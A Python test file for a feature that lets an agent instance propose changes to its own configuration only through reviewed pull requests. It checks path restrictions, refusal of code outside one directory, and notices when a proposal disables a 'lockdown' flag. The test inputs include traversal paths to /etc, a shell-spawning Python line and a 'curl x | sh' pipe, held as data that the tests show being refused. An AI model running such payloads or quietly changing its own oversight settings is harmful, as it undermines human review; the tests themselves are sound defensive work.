"""Tests for propose_config_change — self-modification via PR."""

from __future__ import annotations

import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

import nerve.config_pr as cpr
import nerve.config_validate as cvmod
from nerve.config_pr import ProposeResult, propose_config_change


def _cp(rc=0, stdout="", stderr=""):
    return subprocess.CompletedProcess([], rc, stdout, stderr)


class _FakeGit:
    def __init__(self, *, remote="origin", base="main", fail=None):
        self.remote = remote
        self.base = base
        self.fail = set(fail or [])
        self.calls = []

    def __call__(self, args, cwd):
        self.calls.append(args)
        verb = args[0]
        if verb in self.fail:
            return _cp(1, stderr=f"{verb} failed")
        if verb == "remote":
            # ``remote get-url <name>`` exits non-zero for a remote that is not
            # configured, which is how the origin check asks the question.
            if args[1:2] == ["get-url"]:
                wanted = args[2] if len(args) > 2 else ""
                if wanted in self.remote.split():
                    return _cp(stdout=f"git@example.invalid:o/{wanted}.git\n")
                return _cp(2, stderr=f"error: No such remote '{wanted}'")
            return _cp(stdout=self.remote)
        if verb == "ls-remote":
            return _cp(stdout=f"ref: refs/heads/{self.base}\tHEAD\ndeadbeef\tHEAD\n")
        if verb == "symbolic-ref":
            return _cp(stdout=f"origin/{self.base}\n")
        return _cp(0)

    def did(self, verb):
        return any(a and a[0] == verb for a in self.calls)


def _repo(tmp_path):
    ws = tmp_path / "ws"
    (ws / ".git").mkdir(parents=True)
    return ws


def _changes():
    return [{"path": "config/settings.yaml", "content": "timezone: UTC\n"}]


class TestProposeConfigChange:
    def test_not_a_repo(self, tmp_path):
        r = propose_config_change(tmp_path / "ws", tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "not a git repository" in r.message

    def test_no_remote(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit(remote=""))
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "no 'origin' remote" in r.message

    def test_a_differently_named_remote_is_not_origin(self, tmp_path, monkeypatch):
        """Having *a* remote is not having origin, and the difference matters.

        Everything downstream names origin, as does the sync that pulls merged
        config back, so a proposal cannot follow ``upstream`` instead — it would
        target a branch the instance never reads. Refused here rather than at
        ``_remote_default_branch``, which sees only that origin said nothing and
        reports a missing remote as an unreachable one.
        """
        ws = _repo(tmp_path)
        git = _FakeGit(remote="upstream")
        monkeypatch.setattr(cpr, "_git", git)
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok
        assert "no 'origin' remote" in r.message
        # Named, so 'which remote' is answerable from the message alone.
        assert "git remote add origin" in r.message
        # Stopped before the branch hunt, whose failure would blame reachability.
        assert not git.did("ls-remote"), git.calls

    def test_no_changes(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", [], now=1)
        assert not r.ok and "no changes" in r.message

    def test_happy_path_opens_pr(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        fake = _FakeGit()
        monkeypatch.setattr(cpr, "_git", fake)
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="https://gh/o/r/pull/7"))
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(ws, tmp_path / "cfg", "Add cron", "why", _changes(), now=123)
        assert r.ok and r.pr_url == "https://gh/o/r/pull/7"
        assert "nerve-config/add-cron-123" == r.branch
        assert fake.did("push") and fake.did("worktree")

    def test_invalid_change_no_pr(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        fake = _FakeGit()
        monkeypatch.setattr(cpr, "_git", fake)
        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="x"))
        monkeypatch.setattr(
            cvmod, "validate_config_bundle",
            lambda *a, **k: cvmod.ValidationResult(errors=["bad backend"]),
        )
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and r.validation_errors == ["bad backend"]
        assert not fake.did("push")  # never pushed
        assert not gh_called          # never opened a PR

    def test_fetch_failure(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit(fail=["fetch"]))
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "fetch failed" in r.message

    def test_push_failure(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit(fail=["push"]))
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "push failed" in r.message

    def test_gh_failure_reports_branch_pushed(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(1, stderr="no auth"))
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "gh pr create" in r.message

    def test_changes_written_into_worktree(self, tmp_path, monkeypatch):
        """The proposed content is actually staged (so validation sees it)."""
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="url"))
        seen = {}

        def _capture(config_dir, workspace_override=None, **k):
            wt = Path(workspace_override)
            seen["content"] = (wt / "config" / "settings.yaml").read_text()
            return cvmod.ValidationResult()

        monkeypatch.setattr(cvmod, "validate_config_bundle", _capture)
        propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert seen["content"] == "timezone: UTC\n"


class TestBaseBranch:
    """The base is the remote's default branch, never whatever HEAD is on."""

    def _git_answering(self, *, ls=None, cached=None):
        def _git(args, cwd):
            if args[0] == "ls-remote":
                return ls or _cp(1, stderr="Could not read from remote repository")
            if args[0] == "symbolic-ref":
                return cached or _cp(128, stderr="not a symbolic ref")
            return _cp(0)

        return _git

    def test_prefers_the_remotes_own_answer(self, tmp_path, monkeypatch):
        """A cached origin/HEAD is a clone-time snapshot; the remote is current."""
        monkeypatch.setattr(cpr, "_git", self._git_answering(
            ls=_cp(stdout="ref: refs/heads/trunk\tHEAD\ndeadbeef\tHEAD\n"),
            cached=_cp(stdout="origin/renamed-away\n"),
        ))
        assert cpr._remote_default_branch(tmp_path) == "trunk"

    def test_falls_back_to_the_cached_ref(self, tmp_path, monkeypatch):
        monkeypatch.setattr(cpr, "_git", self._git_answering(
            cached=_cp(stdout="origin/main\n"),
        ))
        assert cpr._remote_default_branch(tmp_path) == "main"

    def test_no_answer_at_all(self, tmp_path, monkeypatch):
        monkeypatch.setattr(cpr, "_git", self._git_answering())
        assert cpr._remote_default_branch(tmp_path) == ""

    def test_fetch_worktree_and_pr_all_use_it(self, tmp_path, monkeypatch):
        """One resolved name, so the three can't disagree about the base."""
        ws = _repo(tmp_path)
        fake = _FakeGit(base="trunk")
        monkeypatch.setattr(cpr, "_git", fake)
        seen = {}

        def _gh(args, cwd):
            seen["args"] = args
            return _cp(stdout="https://gh/pr/1")

        monkeypatch.setattr(cpr, "_gh", _gh)
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert r.ok, r.message
        assert ["fetch", "origin", "trunk"] in fake.calls
        wt_add = next(a for a in fake.calls if a[:2] == ["worktree", "add"])
        assert wt_add[-1] == "origin/trunk"
        assert seen["args"][seen["args"].index("--base") + 1] == "trunk"

    def test_undiscoverable_base_is_refused_not_guessed(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        fake = _FakeGit()
        fake.fail = {"ls-remote", "symbolic-ref"}
        monkeypatch.setattr(cpr, "_git", fake)
        r = propose_config_change(ws, tmp_path / "cfg", "t", "b", _changes(), now=1)
        assert not r.ok and "default branch" in r.message
        assert "set-head" in r.message
        assert not fake.did("fetch") and not fake.did("worktree")


class TestPathSafety:
    def test_rejects_dotdot_traversal(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        fake = _FakeGit()
        monkeypatch.setattr(cpr, "_git", fake)
        r = propose_config_change(
            ws, tmp_path / "cfg", "t", "b",
            [{"path": "../../etc/pwned.yaml", "content": "x"}], now=1,
        )
        assert not r.ok and "../../etc/pwned.yaml" in r.message
        assert not fake.did("worktree")  # rejected before touching git
        assert not (tmp_path.parent / "etc").exists()

    def test_rejects_absolute_path(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        r = propose_config_change(
            ws, tmp_path / "cfg", "t", "b",
            [{"path": "/etc/pwned", "content": "x"}], now=1,
        )
        assert not r.ok and "relative to the workspace root" in r.message

    def test_rel_escapes_helper(self):
        assert cpr._rel_escapes("../x")
        assert cpr._rel_escapes("/abs")
        assert cpr._rel_escapes("a/../../b")
        assert not cpr._rel_escapes("config/cron/jobs.yaml")
        assert not cpr._rel_escapes("skills/x/SKILL.md")


class TestProposableSurface:
    """A proposal carries reviewed configuration — scope, not just containment."""

    @pytest.mark.parametrize("rel", [
        "config/settings.yaml",
        "config/cron/jobs.yaml",
        "config/cron/gates/stale_tasks.py",   # the one sanctioned place for code
        "config/cron/gates/.py",              # the loader's *.py glob matches this
        "skills/deploy-runbook/SKILL.md",
        "skills/deploy-runbook/scripts/notes.md",
        "skills/deploy-runbook/reference.md",
        "SOUL.md",
        "AGENTS.md",
    ])
    def test_allowed(self, rel):
        assert cpr._proposal_path_problem(rel) is None

    @pytest.mark.parametrize("rel,fragment", [
        # Not configuration, however contained.
        (".github/workflows/validate.yml", "proposable surface"),
        (".git/hooks/post-merge", "proposable surface"),
        (".gitattributes", "proposable surface"),
        ("scripts/mechanical-action.sh", "proposable surface"),
        ("nerve/config.py", "proposable surface"),
        # Runtime state the instance maintains for itself.
        ("MEMORY.md", "proposable surface"),
        ("TASK.md", "proposable surface"),
        ("memory/tasks/active/x.md", "proposable surface"),
        # A directory is not a file.
        ("config", "proposable surface"),
        ("skills", "proposable surface"),
        # Code outside the gate-plugin directory.
        ("skills/deploy-runbook/helper.py", "not code"),
        ("skills/deploy-runbook/run.sh", "not code"),
        ("config/evil.py", "not code"),
        ("config/cron/gates/nested/evil.py", "not code"),  # loader never imports it
        ("skills/ops/.py", "not code"),
        ("skills/ops/x.mjs", "not code"),
        ("skills/ops/x.ps1", "not code"),
        # Spellings the *.py glob would miss here but a filesystem may normalize
        # into one it wouldn't.
        ("config/cron/gates/evil.py ", "not code"),
        ("config/cron/gates/evil.py.", "not code"),
        ("config/cron/gates/evil.pyc", "not code"),
        # git metadata and the files that decide whether a diff is readable.
        ("config/.git/config", "git's own metadata"),
        ("config/.gitattributes", "collapse the diff"),
        ("skills/ops/.gitignore", "collapse the diff"),
        # Traversal, including a path that normalizes back inside.
        ("/etc/passwd", "relative to the workspace root"),
        ("../escape.yaml", "relative to the workspace root"),
        ("config/../config/settings.yaml", "relative to the workspace root"),
    ])
    def test_refused(self, rel, fragment):
        problem = cpr._proposal_path_problem(rel)
        assert problem is not None, rel
        assert fragment in problem, problem

    def test_py_outside_gates_never_reaches_git(self, tmp_path, monkeypatch):
        ws = _repo(tmp_path)
        fake = _FakeGit()
        monkeypatch.setattr(cpr, "_git", fake)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Add a helper", "",
            [{"path": "skills/ops/pwn.py", "content": "import os; os.system('sh')\n"}],
            now=1,
        )
        assert not r.ok and "not code" in r.message
        assert not fake.did("worktree")

    def test_mixed_proposal_is_rejected_whole(self, tmp_path, monkeypatch):
        """One refused path kills the proposal — the rest is not quietly kept."""
        ws = _repo(tmp_path)
        fake = _FakeGit()
        monkeypatch.setattr(cpr, "_git", fake)
        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="url"))
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(
            ws, tmp_path / "cfg", "Tidy up", "",
            [
                {"path": "config/settings.yaml", "content": "timezone: UTC\n"},
                {"path": ".github/workflows/validate.yml", "content": "on: push\n"},
                {"path": "scripts/mechanical-action.sh", "content": "curl x | sh\n"},
            ],
            now=1,
        )
        assert not r.ok
        assert "refused 2 of 3" in r.message
        assert ".github/workflows/validate.yml" in r.message
        assert "scripts/mechanical-action.sh" in r.message
        assert not fake.did("worktree") and not gh_called


class TestExecutablePayloadIsFlagged:
    """A gate plugin is accepted, but never quietly."""

    def _propose(self, tmp_path, monkeypatch, changes, body=""):
        ws = _repo(tmp_path)
        monkeypatch.setattr(cpr, "_git", _FakeGit())
        seen = {}

        def _gh(args, cwd):
            seen["args"] = args
            return _cp(stdout="https://gh/o/r/pull/9")

        monkeypatch.setattr(cpr, "_gh", _gh)
        monkeypatch.setattr(cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult())
        r = propose_config_change(
            ws, tmp_path / "cfg", "Add stale-task gate", body, changes, now=5,
        )
        return r, seen

    def test_gate_plugin_opens_a_pr_that_announces_the_code(self, tmp_path, monkeypatch):
        r, seen = self._propose(
            tmp_path, monkeypatch,
            [
                {"path": "config/cron/gates/stale.py", "content": "class G:\n    pass\n"},
                {"path": "config/cron/jobs.yaml", "content": "jobs: []\n"},
            ],
            body="Skip the digest when there is no backlog.",
        )
        assert r.ok, r.message
        assert r.code_paths == ["config/cron/gates/stale.py"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert body.startswith("**This proposal changes what runs on the instance.**")
        assert "config/cron/gates/stale.py" in body
        assert "Skip the digest when there is no backlog." in body  # agent's body kept

    def test_yaml_only_proposal_gets_no_notice(self, tmp_path, monkeypatch):
        r, seen = self._propose(
            tmp_path, monkeypatch,
            [{"path": "config/cron/jobs.yaml", "content": "jobs: []\n"}],
            body="Reschedule the digest.",
        )
        assert r.ok and r.code_paths == []
        body = seen["args"][seen["args"].index("--body") + 1]
        assert body == "Reschedule the digest."

    def test_a_file_named_exactly_dot_py_is_still_code(self, tmp_path, monkeypatch):
        """``Path('.py').suffix`` is empty; the loader's ``*.py`` glob disagrees."""
        r, seen = self._propose(
            tmp_path, monkeypatch,
            [{"path": "config/cron/gates/.py", "content": "import os\n"}],
            body="Adjust the nightly digest schedule.",
        )
        assert r.ok, r.message
        assert r.code_paths == ["config/cron/gates/.py"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert body.startswith("**This proposal changes what runs on the instance.**")

    def test_settings_naming_something_to_run_is_announced(self, tmp_path, monkeypatch):
        r, seen = self._propose(
            tmp_path, monkeypatch,
            [{
                "path": "config/settings.yaml",
                "content": (
                    "timezone: UTC\n"
                    "mcp_servers:\n"
                    "  x:\n"
                    "    command: /bin/sh\n"
                    "    args: ['-c', 'echo hi']\n"
                ),
            }],
            body="Add an MCP server.",
        )
        assert r.ok, r.message
        assert r.code_paths == ["config/settings.yaml"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert "mcp_servers" in body
        assert "which name things the daemon runs" in body

    def test_inert_settings_are_not_announced(self, tmp_path, monkeypatch):
        r, _ = self._propose(
            tmp_path, monkeypatch,
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
        )
        assert r.ok and r.code_paths == []

    def test_unparseable_settings_announce_nothing(self, tmp_path, monkeypatch):
        """Validation is about to reject it; don't guess at effects it won't have."""
        r, _ = self._propose(
            tmp_path, monkeypatch,
            [{"path": "config/settings.yaml", "content": "mcp_servers: [unclosed\n"}],
        )
        assert r.code_paths == []

    @pytest.mark.parametrize("content,expected", [
        # An empty gate_plugins_dir is not "no directory": _expand_path('') is
        # Path('.'), so the daemon imports every *.py in its working directory.
        ("cron:\n  gate_plugins_dir: ''\n", ["cron.gate_plugins_dir"]),
        # Withdrawing the servers the merged config named changes what runs too.
        ("mcp_servers: {}\n", ["mcp_servers"]),
        ("mcp_servers: []\n", ["mcp_servers"]),
        ("mcp_servers:\n", ["mcp_servers"]),          # bare key, null value
        ("codex: false\n", ["codex"]),
        ("proxy: 0\n", ["proxy"]),
        # Genuinely absent stays absent, at both levels.
        ("timezone: UTC\n", []),
        ("cron:\n  timezone: UTC\n", []),
        ("cron: {}\n", []),
        # lockdown is watched, but by change and not by presence — a locked box
        # restates `lockdown: true` in every proposal it ever makes. It belongs
        # to _SECURITY_SETTINGS_KEYS and must never leak into this list.
        ("lockdown: true\n", []),
        ("lockdown: false\n", []),
    ])
    def test_watched_keys_are_judged_by_presence_not_truthiness(self, content, expected):
        assert cpr._effectful_settings_keys(content) == expected

    def test_emptying_the_gate_plugin_dir_is_announced(self, tmp_path, monkeypatch):
        """The falsey value with the largest effect must not slip past the notice."""
        r, seen = self._propose(
            tmp_path, monkeypatch,
            [{"path": "config/settings.yaml",
              "content": "timezone: UTC\ncron:\n  gate_plugins_dir: ''\n"}],
            body="Tidy up the cron section.",
        )
        assert r.ok, r.message
        assert r.code_paths == ["config/settings.yaml"]
        body = seen["args"][seen["args"].index("--body") + 1]
        assert "cron.gate_plugins_dir" in body


class TestSecurityKeysAreJudgedByChange:
    """lockdown is flagged when a proposal *moves* it, never when it restates it."""

    def _dst(self, tmp_path, current=None, *, raw=None):
        """A stand-in for the staged worktree's copy of the file, pre-overwrite."""
        p = tmp_path / "settings.yaml"
        if raw is not None:
            p.write_bytes(raw)
        elif current is not None:
            p.write_text(current)
        return p

    @pytest.mark.parametrize("current,proposed", [
        # The whole point: a locked instance restating its own flag, on every
        # proposal it ever makes. Under presence semantics this always fires,
        # and a notice that always fires is a notice nobody reads.
        ("lockdown: true\ntimezone: UTC\n", "lockdown: true\ntimezone: Europe/Berlin\n"),
        ("lockdown: false\n", "lockdown: false\ntimezone: UTC\n"),
        # Never stated before, still not stated: nothing about lockdown moved.
        ("timezone: UTC\n", "timezone: Europe/Berlin\n"),
        # No settings.yaml in the base branch at all is a definite "states
        # nothing", not an unknown — and the proposal states nothing either.
        (None, "timezone: UTC\n"),
        # Same value, different spelling of the same YAML boolean.
        ("lockdown: yes\n", "lockdown: true\n"),
    ])
    def test_unchanged_is_not_flagged(self, tmp_path, current, proposed):
        dst = self._dst(tmp_path, current)
        assert cpr._security_settings_change(proposed, dst) is None

    @pytest.mark.parametrize("current,proposed,transition", [
        # Disarmed outright.
        ("lockdown: true\n", "lockdown: false\n", "true → false"),
        # Deleting the line disarms it just as well, and presence cannot see it.
        ("lockdown: true\ntimezone: UTC\n", "timezone: UTC\n", "true → not stated"),
        ("lockdown: true\n", "", "true → not stated"),
        # Pinning it off where the file said nothing. Absent already means off,
        # so the effective flag does not move — but the line is new in the diff
        # and this fires once, on the proposal that adds it, not forever after.
        ("timezone: UTC\n", "lockdown: false\ntimezone: UTC\n", "not stated → false"),
        (None, "lockdown: false\n", "not stated → false"),
        # Turning it *on* changes which config layers the daemon reads, which is
        # every bit as much a change to what runs.
        ("timezone: UTC\n", "lockdown: true\ntimezone: UTC\n", "not stated → true"),
        ("lockdown: false\n", "lockdown: true\n", "false → true"),
        # A value only the environment can resolve is a change to a value that
        # was decided in the file, and the notice quotes it as it stands.
        ("lockdown: true\n", "lockdown: ${NERVE_LOCKDOWN}\n", "true → '${NERVE_LOCKDOWN}'"),
    ])
    def test_a_moved_value_is_flagged(self, tmp_path, current, proposed, transition):
        dst = self._dst(tmp_path, current)
        reason = cpr._security_settings_change(proposed, dst)
        assert reason and f"lockdown ({transition})" in reason

    @pytest.mark.parametrize("kwargs", [
        {"current": "lockdown: [unclosed\n"},          # malformed YAML
        {"current": "- not\n- a mapping\n"},           # parses, wrong shape
        {"raw": b"lockdown: \xff\xfe true\n"},         # not decodable as UTF-8
    ])
    def test_an_unreadable_base_revision_errs_toward_telling(self, tmp_path, kwargs):
        """It might have said `lockdown: true`; silence is the wrong guess."""
        dst = self._dst(tmp_path, **kwargs)
        # Note the proposal does not mention lockdown at all — the point is that
        # we cannot tell whether it *removed* it.
        reason = cpr._security_settings_change("timezone: UTC\n", dst)
        assert reason and "lockdown" in reason
        assert "could not be" in reason

    def test_an_unreadable_base_revision_never_raises(self, tmp_path):
        """A directory where the file should be still has to answer, not throw."""
        (tmp_path / "settings.yaml").mkdir()
        reason = cpr._security_settings_change("lockdown: true\n", tmp_path / "settings.yaml")
        assert reason and "lockdown" in reason

    def test_an_unreadable_proposal_announces_nothing(self, tmp_path):
        """Mirror of the presence rule: validation is about to reject it."""
        dst = self._dst(tmp_path, "lockdown: true\n")
        assert cpr._security_settings_change("lockdown: [unclosed\n", dst) is None


@pytest.mark.skipif(not __import__("shutil").which("git"), reason="git not available")
class TestRealGit:
    def _git(self, *args, cwd):
        import os
        subprocess.run(
            ["git", *args], cwd=str(cwd), check=True, capture_output=True, text=True,
            env={"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                 "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
                 "HOME": str(cwd), "PATH": os.environ["PATH"]},
        )

    def _out(self, *args, cwd):
        return subprocess.run(
            ["git", *args], cwd=str(cwd), capture_output=True, text=True,
        ).stdout.strip()

    def _setup(self, tmp_path, settings="timezone: UTC\n"):
        origin = tmp_path / "origin"
        origin.mkdir()
        self._git("init", "-b", "main", cwd=origin)
        (origin / "config").mkdir()
        (origin / "config" / "settings.yaml").write_text(settings)
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        ws = tmp_path / "ws"
        self._git("clone", str(origin), str(ws), cwd=tmp_path)
        return ws

    def test_opens_pr_and_cleans_up(self, tmp_path, monkeypatch):
        ws = self._setup(tmp_path)
        monkeypatch.setattr(cpr, "_gh", lambda a, c: _cp(stdout="https://gh/pr/1"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Change tz", "body",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=999,
        )
        assert r.ok, r.message
        # Live working tree is untouched (still on main, clean, original content).
        status = subprocess.run(
            ["git", "status", "--porcelain"], cwd=str(ws), capture_output=True, text=True,
        )
        assert status.stdout.strip() == ""
        assert "UTC" in (ws / "config" / "settings.yaml").read_text()
        # No dangling local nerve-config/* branch remains.
        branches = subprocess.run(
            ["git", "branch"], cwd=str(ws), capture_output=True, text=True,
        ).stdout
        assert "nerve-config/" not in branches
        # The branch WAS pushed to origin.
        remote_branches = subprocess.run(
            ["git", "branch", "-r"], cwd=str(ws), capture_output=True, text=True,
        ).stdout
        assert "nerve-config/change-tz-999" in remote_branches

    def test_undecodable_gh_output_still_reports_the_pushed_branch(
        self, tmp_path, monkeypatch,
    ):
        """gh runs after the push, so its failure mode decides what is recoverable.

        There is a message for exactly this state — branch on the remote, no PR —
        and a decode error used to replace it with "internal error: 'utf-8' codec
        can't decode…", leaving the pushed branch with nothing pointing at it.
        """
        import os

        ws = self._setup(tmp_path)
        bin_dir = tmp_path / "bin"
        bin_dir.mkdir()
        (bin_dir / "gh").write_bytes(
            b'#!/bin/sh\nprintf "error: could not create pull request \\337\\n" >&2\n'
            b"exit 1\n"
        )
        (bin_dir / "gh").chmod(0o755)
        monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")

        r = propose_config_change(
            ws, tmp_path / "cfg", "Change tz", "body",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=42,
        )
        assert not r.ok
        assert "gh pr create" in r.message, r.message
        assert "Open the PR manually" in r.message
        assert r.branch
        # And the branch the message sends them to really is there.
        assert r.branch in self._out("ls-remote", "--heads", "origin", cwd=ws)

    def _capture_gh(self, monkeypatch, url="https://gh/pr/1"):
        seen = {}

        def _gh(args, cwd):
            seen["args"] = args
            return _cp(stdout=url)

        monkeypatch.setattr(cpr, "_gh", _gh)
        return seen

    def _lockdown_proposal(self, tmp_path, monkeypatch, base, proposed, now):
        """Propose ``proposed`` over a base branch that really contains ``base``.

        A real clone, because the comparison is against the revision the staged
        worktree is checked out from — a faked worktree has no base revision to
        compare with and would pass whatever the rule was. Validation is stubbed:
        `lockdown: true` in a bundle drags in the locked-instance secret checks,
        which are a different feature's business.
        """
        ws = self._setup(tmp_path, base)
        seen = self._capture_gh(monkeypatch)
        monkeypatch.setattr(
            cvmod, "validate_config_bundle", lambda *a, **k: cvmod.ValidationResult(),
        )
        r = propose_config_change(
            ws, tmp_path / "cfg", "Tidy settings", "Routine tidy-up.",
            [{"path": "config/settings.yaml", "content": proposed}], now=now,
        )
        assert r.ok, r.message
        return r, seen["args"][seen["args"].index("--body") + 1]

    def test_restating_lockdown_unchanged_is_not_announced(self, tmp_path, monkeypatch):
        """The false positive that would fire on every proposal a locked box makes.

        Judged by presence this flags its own unchanged flag, every time, and a
        notice a reviewer learns to scroll past protects nothing.
        """
        r, body = self._lockdown_proposal(
            tmp_path, monkeypatch,
            "lockdown: true\ntimezone: UTC\n",
            "lockdown: true\ntimezone: Europe/Berlin\n",
            now=21,
        )
        assert r.code_paths == []
        assert body == "Routine tidy-up."

    def test_turning_lockdown_off_is_announced(self, tmp_path, monkeypatch):
        r, body = self._lockdown_proposal(
            tmp_path, monkeypatch,
            "lockdown: true\ntimezone: UTC\n",
            "lockdown: false\ntimezone: UTC\n",
            now=22,
        )
        assert r.code_paths == ["config/settings.yaml"]
        assert body.startswith("**This proposal changes what runs on the instance.**")
        assert "lockdown (true → false)" in body

    def test_deleting_the_lockdown_line_is_announced(self, tmp_path, monkeypatch):
        """Removing the key disarms the control, and presence cannot see it at all."""
        r, body = self._lockdown_proposal(
            tmp_path, monkeypatch,
            "lockdown: true\ntimezone: UTC\n", "timezone: UTC\n", now=23,
        )
        assert r.code_paths == ["config/settings.yaml"]
        assert "lockdown (true → not stated)" in body

    def test_both_notices_appear_together(self, tmp_path, monkeypatch):
        """The two rules are independent; one firing must not hide the other."""
        r, body = self._lockdown_proposal(
            tmp_path, monkeypatch,
            "lockdown: true\ntimezone: UTC\n",
            "lockdown: false\nmcp_servers:\n  x:\n    command: /bin/sh\n",
            now=24,
        )
        assert r.code_paths == ["config/settings.yaml"]
        assert "mcp_servers" in body and "lockdown" in body

    def test_detached_head_targets_the_remote_default(self, tmp_path, monkeypatch):
        """A sync leaves the workspace detached; 'HEAD' is not a branch to target."""
        ws = self._setup(tmp_path)
        self._git("checkout", "--detach", "HEAD", cwd=ws)
        assert self._out("rev-parse", "--abbrev-ref", "HEAD", cwd=ws) == "HEAD"
        seen = self._capture_gh(monkeypatch)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Change tz", "",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=11,
        )
        assert r.ok, r.message
        assert seen["args"][seen["args"].index("--base") + 1] == "main"

    def test_feature_checkout_neither_targets_nor_carries_that_branch(
        self, tmp_path, monkeypatch,
    ):
        """Basing off the current branch would smuggle its unmerged commits in."""
        ws = self._setup(tmp_path)
        origin = tmp_path / "origin"
        self._git("checkout", "-b", "feature", cwd=origin)
        (origin / "config" / "unreviewed.yaml").write_text("x: 1\n")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "wip", cwd=origin)
        self._git("checkout", "main", cwd=origin)
        self._git("fetch", "origin", cwd=ws)
        self._git("checkout", "-b", "feature", "origin/feature", cwd=ws)

        seen = self._capture_gh(monkeypatch)
        r = propose_config_change(
            ws, tmp_path / "cfg", "Change tz", "",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=12,
        )
        assert r.ok, r.message
        tree = self._out(
            "ls-tree", "-r", "--name-only", "origin/nerve-config/change-tz-12", cwd=ws,
        )
        assert "config/unreviewed.yaml" not in tree
        assert seen["args"][seen["args"].index("--base") + 1] == "main"

    def test_no_discoverable_base_is_refused_before_staging(self, tmp_path, monkeypatch):
        """No cached origin/HEAD and an unreachable origin: say so, don't guess."""
        ws = self._setup(tmp_path)
        self._git("symbolic-ref", "-d", "refs/remotes/origin/HEAD", cwd=ws)
        self._git("remote", "set-url", "origin", str(tmp_path / "gone"), cwd=ws)
        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="u"))
        r = propose_config_change(
            ws, tmp_path / "cfg", "Change tz", "",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=13,
        )
        assert not r.ok and "default branch" in r.message
        assert not gh_called
        assert "nerve-config/" not in self._out("branch", cwd=ws)

    def test_workspace_reached_through_a_symlink_is_still_guarded(
        self, tmp_path, monkeypatch,
    ):
        """The path guard resolves the root, so a symlinked checkout is judged
        against the tree it really is — and a redirect inside it still lands
        where the scope check can see it."""
        origin = tmp_path / "origin"
        (origin / "config" / "cron").mkdir(parents=True)
        (origin / "skills").mkdir()
        self._git("init", "-b", "main", cwd=origin)
        (origin / "config" / "settings.yaml").write_text("timezone: UTC\n")
        (origin / "skills" / ".keep").write_text("")
        (origin / "config" / "cron" / "gates").symlink_to("../../skills")
        self._git("add", "-A", cwd=origin)
        self._git("commit", "-m", "init", cwd=origin)
        real = tmp_path / "ws"
        self._git("clone", str(origin), str(real), cwd=tmp_path)
        link = tmp_path / "via-symlink"
        link.symlink_to(real)

        gh_called = []
        monkeypatch.setattr(cpr, "_gh", lambda a, c: gh_called.append(a) or _cp(stdout="u"))
        # Contained, allowed where it says it is: goes through.
        r = propose_config_change(
            link, tmp_path / "cfg", "Change tz", "",
            [{"path": "config/settings.yaml", "content": "timezone: Europe/Berlin\n"}],
            now=14,
